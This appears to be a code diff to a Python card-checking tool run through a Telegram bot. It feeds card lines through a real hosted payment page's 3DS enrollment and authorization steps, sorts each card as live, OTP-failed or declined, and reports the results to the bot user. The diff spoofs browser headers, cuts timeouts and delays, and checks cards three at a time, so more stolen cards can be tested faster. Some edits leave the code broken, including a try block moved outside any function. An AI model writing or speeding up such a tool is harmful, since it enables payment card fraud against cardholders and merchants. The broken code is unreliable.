@@ -99,6 +99,15 @@ class CardChecker:
     def __init__(self, check_mode='basic'):
         self.session = requests.Session()
         self.check_mode = check_mode
+        # Optimize session
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': '*/*',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive'
+        })
+        # Reduce timeout for faster responses
+        self.timeout = 10
     
     def analyze_3ds_response(self, html_content):
         """
@@ -366,7 +375,7 @@ class CardChecker:
             
         except Exception as e:
             return None, 'UNCLEAR', f"⚠️ Analysis error: {str(e)[:30]}"
-            [
+        [    
                 # Card issues
                 (r"card\s+(was\s+)?declined", "Card declined"),
                 (r"card\s+not\s+supported", "Card not supported"),
@@ -437,9 +446,9 @@ class CardChecker:
                 (r"fraud\s+prevention", "Fraud prevention triggered"),
             ]
             
-            for pattern, message in critical_failures:
-                if re.search(pattern, text_content, re.IGNORECASE):
-                    return False, 'OTP_FAILED', f"❌ {message}"
+        for pattern, message in critical_failures:
+            if re.search(pattern, text_content, re.IGNORECASE):
+             return False, 'OTP_FAILED', f"❌ {message}"
             
             # ========== PRIORITY 3: SUCCESS PATTERNS (OTP SENT) ==========
             # Only check success if NO error keywords found
@@ -562,19 +571,26 @@ class CardChecker:
                         if not in_error_form:
                             return True, 'OTP_SUCCESS', "✅ Verification form detected"
             
-            # ========== PRIORITY 6: AMBIGUOUS RESPONSES ==========
-            if 'loading' in text_content or 'please wait' in text_content:
-                return None, 'UNCLEAR', "⏳ Loading response"
-            
-            # If we reach here with error keywords, it's likely a failure
-            if has_error_keyword:
-                return False, 'OTP_FAILED', "❌ Error detected in response"
-            
-            return None, 'UNCLEAR', "❓ Response unclear"
-            
-        except Exception as e:
-            return None, 'UNCLEAR', f"⚠️ Analysis error: {str(e)[:30]}"
-        
+# ========== PRIORITY 6: AMBIGUOUS RESPONSES ========== 
+
+try:
+    # ========== PRIORITY 6: AMBIGUOUS RESPONSES ========== 
+
+    # Check if the response contains keywords indicating a loading state
+    if 'loading' in text_content or 'please wait' in text_content:
+        return None, 'UNCLEAR', "⏳ Loading response"  # In case of loading, we return unclear
+
+    # If error-related keywords are detected, handle failure
+    if has_error_keyword:
+        return False, 'OTP_FAILED', "❌ Error detected in response"  # OTP failure detected
+
+    # If no specific error is detected, but the response is unclear, mark it as unclear
+    return None, 'UNCLEAR', "❓ Response unclear"
+
+except Exception as e:
+    # Handle any unexpected exceptions during the analysis process
+    return None, 'UNCLEAR', f"⚠️ Analysis error: {str(e)[:30]}"  # Return an error message with part of the exception description
+
     def check(self, card_line):
         """Check a single card"""
         debug_log = []
@@ -625,7 +641,7 @@ class CardChecker:
                 'HPP_CHALLENGE_REQUEST_INDICATOR': 'NO_PREFERENCE',
             }
             
-            response = self.session.post('https://hpp.globaliris.com/pay', headers=headers, data=data, timeout=15)
+            response = self.session.post('https://hpp.globaliris.com/pay', headers=headers, data=data, timeout=self.timeout)
             debug_log.append(f"Step 1: GUID Response Status: {response.status_code}")
             
             soup = BeautifulSoup(response.text, 'html.parser')
@@ -638,7 +654,7 @@ class CardChecker:
             
             # Step 2: Load card page
             card_page_url = f"https://hpp.globaliris.com/hosted-payments/blue/card.html?guid={guid}"
-            self.session.get(card_page_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=10)
+            self.session.get(card_page_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=self.timeout)
             debug_log.append(f"Step 2: Card Page Loaded")
             
             # Step 3: Verify enrollment
@@ -662,7 +678,7 @@ class CardChecker:
                 'https://hpp.globaliris.com/hosted-payments/blue/3ds2/verifyEnrolled',
                 headers=headers_xhr,
                 data=verify_data,
-                timeout=15
+                timeout=self.timeout
             )
             
             debug_log.append(f"Step 3: Verify Response Status: {verify_response.status_code}")
@@ -682,7 +698,7 @@ class CardChecker:
             method_url = verify_result.get('method_url')
             method_data = verify_result.get('method_data', {})
             
-            # Step 4: Execute 3DS Method
+            # Step 4: Execute 3DS Method (with reduced timeout)
             method_completion_indicator = 'U'
             
             if method_url and method_data:
@@ -692,7 +708,7 @@ class CardChecker:
                         method_url,
                         data={'threeDSMethodData': encoded_method_data},
                         headers={'Content-Type': 'application/x-www-form-urlencoded'},
-                        timeout=10
+                        timeout=8
                     )
                     if method_response.status_code == 200:
                         method_completion_indicator = 'Y'
@@ -703,7 +719,8 @@ class CardChecker:
                     method_completion_indicator = 'U'
                     debug_log.append(f"Step 4: Method Error: {str(e)[:50]}")
                 
-                time.sleep(2)
+                # Reduced sleep time
+                time.sleep(0.5)
             
             # Step 5: Send card data
             full_card_data = {
@@ -728,7 +745,7 @@ class CardChecker:
                 'https://hpp.globaliris.com/hosted-payments/blue/api/auth',
                 headers=headers_xhr,
                 data=full_card_data,
-                timeout=15
+                timeout=self.timeout
             )
             
             debug_log.append(f"Step 5: Auth Response Status: {auth_response.status_code}")
@@ -797,7 +814,7 @@ class CardChecker:
                             challenge_url,
                             headers=challenge_headers,
                             data=challenge_data,
-                            timeout=15
+                            timeout=self.timeout
                         )
                         
                         debug_log.append(f"Challenge Status: {challenge_response.status_code}")
@@ -891,55 +908,42 @@ async def check_card(card, bot_app, user_id):
     parts = card.strip().split('|')
     if len(parts) != 4:
         stats['errors'] += 1
-        stats['checking'] -= 1
-        stats['last_response'] = 'Format Error'
-        await update_dashboard(bot_app, user_id)
         return card, "ERROR", "Invalid format"
     
     try:
         if not stats['is_running']:
-            stats['checking'] -= 1
             return card, "STOPPED", "Stopped by user"
         
+        # Use asyncio to run checker without blocking
+        loop = asyncio.get_event_loop()
         checker = CardChecker(check_mode=stats['check_mode'])
-        status, message, debug_info = checker.check(card)
+        status, message, debug_info = await loop.run_in_executor(None, checker.check, card)
         
         if status == 'SUCCESS':
             stats['success_3ds'] += 1
-            stats['checking'] -= 1
             stats['last_response'] = '3DS Success ✅'
-            await update_dashboard(bot_app, user_id)
             await send_result(bot_app, card, "SUCCESS", message, debug_info, user_id)
             return card, "SUCCESS", message
         
         elif status == 'OTP_FAILED':
-            # NEW: Handle OTP Failed status
             stats['otp_failed'] += 1
-            stats['checking'] -= 1
             stats['last_response'] = 'OTP Failed ⚠️'
-            await update_dashboard(bot_app, user_id)
             await send_result(bot_app, card, "OTP_FAILED", message, debug_info, user_id)
             return card, "OTP_FAILED", message
             
         elif status == 'FAILED':
             stats['failed'] += 1
-            stats['checking'] -= 1
             stats['last_response'] = 'Failed ❌'
-            await update_dashboard(bot_app, user_id)
             return card, "FAILED", message
             
         else:
             stats['errors'] += 1
-            stats['checking'] -= 1
             stats['last_response'] = f'Error: {message[:20]}'
-            await update_dashboard(bot_app, user_id)
             return card, "ERROR", message
             
     except Exception as e:
         stats['errors'] += 1
-        stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
-        await update_dashboard(bot_app, user_id)
         return card, "EXCEPTION", str(e)
 
 def create_dashboard_keyboard(user_id):
@@ -1111,24 +1115,44 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def process_cards(cards, bot_app, user_id):
     stats = get_user_stats(user_id)
     
-    for i, card in enumerate(cards):
+    # Process 3 cards at a time concurrently
+    batch_size = 3
+    total_cards = len(cards)
+    
+    for i in range(0, total_cards, batch_size):
         if not stats['is_running']:
             stats['last_response'] = 'Stopped by user 🛑'
             await update_dashboard(bot_app, user_id)
             break
         
-        stats['checking'] = 1
-        parts = card.split('|')
-        stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
+        # Get batch of cards
+        batch = cards[i:i + batch_size]
+        
+        # Update checking count
+        stats['checking'] = len(batch)
+        
+        # Update current card display (show first card in batch)
+        if batch:
+            parts = batch[0].split('|')
+            stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else batch[0][:10]
+            if len(batch) > 1:
+                stats['current_card'] += f" +{len(batch)-1} more"
+        
         await update_dashboard(bot_app, user_id)
         
-        await check_card(card, bot_app, user_id)
-        stats['cards_checked'] += 1
+        # Process batch concurrently
+        tasks = [check_card(card, bot_app, user_id) for card in batch]
+        await asyncio.gather(*tasks)
         
-        if stats['cards_checked'] % 5 == 0:
+        stats['cards_checked'] += len(batch)
+        stats['checking'] = 0
+        
+        # Update dashboard every 10 cards instead of 5
+        if stats['cards_checked'] % 10 == 0 or stats['cards_checked'] == total_cards:
             await update_dashboard(bot_app, user_id)
         
-        await asyncio.sleep(2)
+        # Reduced delay between batches
+        await asyncio.sleep(0.3)
     
     stats['is_running'] = False
     stats['checking'] = 0
